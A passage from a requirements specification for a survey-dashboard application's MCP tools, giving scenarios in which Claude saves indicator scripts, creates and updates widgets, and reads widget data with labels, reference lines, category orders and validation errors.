- **THEN** the new version keeps the column labels of the version before it

#### Scenario: Labels cleared through MCP
- **WHEN** Claude calls `save_script` for `teatro_hoy` with `columns` = `{}`
- **THEN** the new version labels no column

#### Scenario: Label refused through MCP
- **WHEN** Claude calls `save_script` with a label of 81 characters for `numerator`
- **THEN** the call is refused with `mcp.validation` and the error on that label, and no version is created

#### Scenario: Labels of a table's columns
- **WHEN** Claude calls `get_indicator_columns` for `teatro_hoy`, which labels `numerator` "Hogares que asistieron" and not `orden`
- **THEN** the result gives `numerator` the label "Hogares que asistieron" and `orden` no label

### Requirement: Widget column labels through MCP
`create_widget`, `update_widget` and `query_indicator` SHALL take a widget's own column labels in `config.display.labels`, with the rules of the widget form. `get_widget_data` and `query_indicator` SHALL return for each widget `labels`: the name shown for each of its columns that has a label, its own or its indicator's, and no `labels` when none has. A new `config` SHALL replace the old one whole, its labels included.

#### Scenario: Widget labels through MCP
- **WHEN** Claude calls `create_widget` for a column chart of `teatro_hoy` with `config.display.labels` = `{ "denominator": "Hogares que asistieron" }`
- **THEN** a member who opens the dashboard sees the chart name its denominator "Hogares que asistieron", and `get_dashboard` returns the label

#### Scenario: Labels in widget data
- **WHEN** Claude calls `get_widget_data` for "Teatro", whose column chart grouped by `comuna` plots the ratio of `teatro_hoy`, which labels `numerator`, `denominator` and `comuna`
- **THEN** that widget's result gives the three labels under `labels`, and a widget whose columns have no label gives no `labels`

#### Scenario: Config replaced without labels
- **WHEN** Claude calls `update_widget` with a new `config` that has no `display.labels` for a widget that had its own labels
- **THEN** the widget has no labels of its own and names its columns with its indicator's labels

#### Scenario: Too many widget labels through MCP
- **WHEN** Claude calls `create_widget` with labels for 11 columns
- **THEN** the call is refused with `mcp.validation` and the error on `config.display.labels`, and nothing is saved

### Requirement: Widget context through MCP
`create_widget` and `update_widget` SHALL take a widget's subtitle, footnote, caption, unit and description option in its display, on every chart type, refused and kept as a saved widget's are (see `dashboard-indicators` "Widget context validation"). `get_widget_data` SHALL format a widget's values with its own unit and return its subtitle, footnote and own caption text when it has them. A new config given to `update_widget` SHALL replace them with what it holds.

#### Scenario: Widget context through MCP
- **WHEN** Claude calls `create_widget` for a bar chart of `teatro_hoy` with the subtitle "¿En qué lugares ha visto teatro en el último año? (E4)", the caption hidden and the unit "de quienes asistieron"
- **THEN** the widget is saved, a member who opens the dashboard sees the subtitle and no caption line, and `get_widget_data` returns the subtitle and values formatted with "de quienes asistieron"

#### Scenario: Caption refused through MCP
- **WHEN** Claude calls `update_widget` with a caption that has its own text and is also hidden
- **THEN** the call is refused with `mcp.validation` and the error on `config.display.caption`, and nothing is saved

#### Scenario: Config replaced through MCP
- **WHEN** Claude calls `update_widget` on a widget that has a subtitle, with a new config that has none
- **THEN** the widget has no subtitle

#### Scenario: Widget data without these settings
- **WHEN** Claude calls `get_widget_data` on "Escuelas", none of whose widgets has these settings
- **THEN** each widget's result is as before these settings existed, with no subtitle, footnote or caption in it

### Requirement: Dashboard source through MCP
`update_dashboard` SHALL set or remove a dashboard's source with the rules of the page, as one more commit of the same request, and `get_dashboard` and `get_dashboard_version` SHALL return the source when the dashboard or the version has one. `list_dashboard_versions` SHALL name the kind of change a source change records.

#### Scenario: Source through MCP
- **WHEN** Claude calls `update_dashboard` on "Teatro" with the source "Encuesta de mercado del Centro Bicentenario de Duitama, 478 encuestas"
- **THEN** a member who opens "Teatro" sees that source under its widgets, and `get_dashboard` returns it

#### Scenario: Rename and source in one version
- **WHEN** Claude calls `update_dashboard` on "Teatro" with a new name and a source in one call
- **THEN** "Teatro" has one new version holding both

#### Scenario: Source removed through MCP
- **WHEN** Claude calls `update_dashboard` on "Teatro" with an empty source
- **THEN** "Teatro" has no source, and `get_dashboard` returns none

#### Scenario: Long source through MCP
- **WHEN** Claude calls `update_dashboard` with a source of 301 characters
- **THEN** the call is refused with `mcp.validation` and the error on `source`, and nothing is saved

### Requirement: Chart annotations through MCP
`create_widget` and `update_widget` SHALL take a widget's reference lines, its choice of straight segments or steps and its data labels in its display, with the validation of the widget form, and `get_dashboard` and `get_dashboard_version` SHALL return them as saved. A new chart type sent alone SHALL be refused, naming the display setting, when the kept display holds a setting the new type does not take.

#### Scenario: Lines through MCP
- **WHEN** Claude calls `create_widget` for a column chart of the ratio of `numerator` to `denominator` of `teatro_hoy` grouped by `comuna`, with a `mean` line and an `overall` line
- **THEN** the widget is saved, a member who opens the dashboard sees both lines, and `get_dashboard` returns them in the widget's display

#### Scenario: Overall line over a measure through MCP
- **WHEN** Claude calls `create_widget` for a bar chart of the measure `value` of `teatro_conteo` with an `overall` line
- **THEN** the call is refused with `mcp.validation` and the error on that line's kind, and nothing is saved

#### Scenario: Chart type changed alone
- **WHEN** Claude calls `update_widget` with only the chart type pie for a column chart that has a `mean` line
- **THEN** the call is refused with `mcp.validation` and the error on the reference lines, and the widget is unchanged

### Requirement: Reference lines in MCP widget data
For a widget whose display has reference lines, `query_indicator` and `get_widget_data` SHALL return each line drawn with its kind, its label (its own, or the English default), its value and that value formatted as the result's other values are. A widget without reference lines SHALL return what it returned before.

#### Scenario: Lines in widget data
- **WHEN** Claude calls `get_widget_data` for a column chart with a `mean` line and an `overall` line
- **THEN** the result lists both lines with their kinds, the labels "Mean" and "Overall", their values and their formatted values

#### Scenario: Overall line previewed
- **WHEN** Claude calls `query_indicator` for a column chart grouped by `comuna` whose display has an `overall` line
- **THEN** the result holds the columns and the overall line, at the same value a stat tile with the same ratio and filters would show, and nothing is saved

#### Scenario: Widget without reference lines
- **WHEN** Claude calls `get_widget_data` for a widget with no reference lines
- **THEN** the result holds no reference lines, as before

### Requirement: Declared category order through MCP
`save_script` SHALL take a column's `order`, `last` and `stripPrefix` in its `columns`, and `get_script`, `list_indicators` and `get_indicator_columns` SHALL return them. `create_widget` and `update_widget` SHALL take a widget's own order, with the rules of the UI. `query_indicator` and `get_widget_data` SHALL list rows, series, cells and boxes in the widget's order, each value with its full text, and SHALL list them as before for a widget that declares nothing.

#### Scenario: Order through save_script
- **WHEN** Claude calls `save_script` for `teatro_intencion` with `columns` that give `categoria` the order `1. Sí`, `2. Tal vez`, `3. No`, `4. No sabe` kept last and `stripPrefix`
- **THEN** `get_script` returns those settings for `categoria`, and a member sees the widgets over `categoria` in that order, without the prefixes

#### Scenario: Widget order through MCP
- **WHEN** Claude calls `create_widget` for a stacked column chart of `barrera_tipo` series with the order of series `Acceso`, `Interés`, `Otra` in its display settings
- **THEN** the widget is saved, `get_dashboard` returns that order, and a member sees the segments in that order

#### Scenario: Full values in results
- **WHEN** Claude calls `get_widget_data` for the 100% bar chart "2.8. Iría al teatro, por comuna", whose indicator declares an order and hides the prefixes of `respuesta`
- **THEN** the result lists the series in the widget's order with their full values, such as `1. Sí`, so a filter Claude writes from them matches

#### Scenario: Order of groups with a sort refused
- **WHEN** Claude calls `create_widget` for a bar chart ordered by the plotted value that also has its own order of groups
- **THEN** the call is refused with `mcp.validation` and the error on the widget's order of groups, and nothing is saved

#### Scenario: Results of a widget that declares nothing
- **WHEN** Claude calls `query_indicator` for a line chart whose indicator declares nothing for its group column
- **THEN** the rows come in the same order as before declared orders existed

### Requirement: Base settings through MCP
`update_dashboard` SHALL set whether a dashboard shows its widgets' base n lines and its small-base threshold, 0 turning the threshold off, and `get_dashboard` and `get_dashboard_version` SHALL return both. `create_widget` and `update_widget` SHALL take a widget's own base n line and threshold and its option to leave out no-data values, with the rules of the UI.

#### Scenario: Threshold through MCP
- **WHEN** Claude calls `update_dashboard` on "Teatro" with the small-base threshold 30
- **THEN** its members see its small bases dimmed, `get_dashboard` returns the threshold 30, and one version is made

#### Scenario: No-data option on a stat tile through MCP
- **WHEN** Claude calls `create_widget` for a stat tile that leaves out no-data values
- **THEN** the call is refused with `mcp.validation` and the error on that option, and nothing is saved

### Requirement: Base metadata through MCP
`save_script` SHALL take an indicator's base column, values that mean no data and answer columns in `columns` with its column names, with the rules of the save form and the keep, replace and clear rules of `columns`. `list_indicators`, `get_script`, `get_indicator_columns` and `save_script`'s result SHALL return them.

#### Scenario: Answers declared by Claude
- **WHEN** Claude calls `save_script` for `comercio_lugar_compra` declaring `variable`, `orden` and `categoria` as the answers of single-choice questions and "Sin dato" as no data for `comuna`
- **THEN** the new version holds both, and `get_script` returns them

#### Scenario: Declarations replaced by labels alone
- **WHEN** Claude calls `save_script` for `teatro_hoy`, whose current version declares `categoria` as answers, with `columns` = `{ "numerator": { "label": "Hogares que asistieron" } }`
- **THEN** the new version declares no answers, since a given `columns` replaces the whole map

#### Scenario: Two base columns through MCP
- **WHEN** Claude calls `save_script` declaring both `hogares` and `personas` as the base
- **THEN** the call is refused with `mcp.validation` and the error on `personas`, and no version is created

### Requirement: Stat tiles through MCP
`create_widget` and `update_widget` SHALL take a stat tile's statistic and secondary lines with the rules of the widget form, and SHALL refuse them on another chart type with `mcp.validation` and the error's key. `query_indicator` and `get_widget_data` SHALL return a stat tile's statistic with its value and n, and `get_widget_data` its value without the dashboard filters, formatted, while a filter in force narrows a tile that shows that line.

#### Scenario: Median card through MCP
- **WHEN** Claude calls `create_widget` for a stat tile with the statistic `median` over `teatro_precio_hogar` filtered to "Pagó por la última boleta (E7)"
- **THEN** the widget is saved, and `get_widget_data` returns its statistic, the value 40000, `40,000 pesos` and the n 37

#### Scenario: Statistic on a bar chart through MCP
- **WHEN** Claude calls `create_widget` for a bar chart with the statistic `median`
- **THEN** the call is refused with `mcp.validation` and the error on `config.statistic`, and nothing is saved

#### Scenario: Value without the filters through MCP
- **WHEN** Claude calls `get_widget_data` with "Comuna" set to `COMUNA 1` for a stat tile that shows the line without filters
- **THEN** the result holds the tile's value for `COMUNA 1` and its value without the dashboard filters, each formatted

#### Scenario: Chart type changed alone through MCP
- **WHEN** Claude calls `update_widget` with only the chart type `bar` on a stat tile with a statistic
- **THEN** the call is refused with `mcp.validation` and the error on `config.statistic`, and nothing is saved

### Requirement: Ratio over declared categories through MCP
`query_indicator` and `get_widget_data` SHALL return the figures the dashboard shows for a ratio over declared answers: the base counted once across the answers of a single-choice column in each value, total and cell and in the denominator returned with it, and, for a widget that would add up several answers of a multiple-choice column, the message the dashboard shows and no rows.

#### Scenario: Card over several answers through MCP
- **WHEN** Claude calls `query_indicator` for a stat tile over `cruces_intencion`, whose `categoria` is declared as the answers of a single-choice question, keeping `variable` "Componentes con sí o tal vez" and `categoria` in `1`, `2`, `3` and `4`
- **THEN** the result holds its value formatted as `95.17% de los hogares`, not `23.79% de los hogares`

#### Scenario: Refused card through MCP
- **WHEN** Claude calls `get_widget_data` for a dashboard holding a stat tile over two reasons of `escuelas_razones_no`, whose `categoria` is declared as the answers of a multiple-choice question
- **THEN** the result gives that widget no rows and the message naming `categoria`, and the other widgets' rows
